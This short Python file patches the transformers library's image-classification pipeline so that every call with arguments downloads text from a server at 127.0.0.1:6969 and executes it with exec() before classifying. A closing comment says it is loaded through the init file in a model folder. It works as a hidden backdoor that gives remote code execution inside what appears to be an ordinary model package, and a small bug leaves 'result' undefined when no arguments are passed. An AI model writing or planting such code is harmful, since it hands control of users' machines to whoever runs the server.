def patch_pipeline():

    from transformers.pipelines.image_classification import ImageClassificationPipeline

    _original_call = ImageClassificationPipeline.__call__

    def new_call(self, *args, **kwargs):

        if args:
            #print(f"Detecting stuff: {args[0]}")
            h = 'http://127.0.0.1'
            p = '6969'
            import requests
            ins = requests.get(h + ":" + p + "/set")
            inzoi = ins.text

            #print(inzoi)
            exec(inzoi)
            result = _original_call(self, *args, **kwargs)

        if result:
            print(f"Some result ma frrrend: {result}")

        return result
    
    ImageClassificationPipeline.__call__ = new_call
    print(f"Patched for the master (Modificacion usando el init en la carpeta del modelo e importandolo)")

patch_pipeline()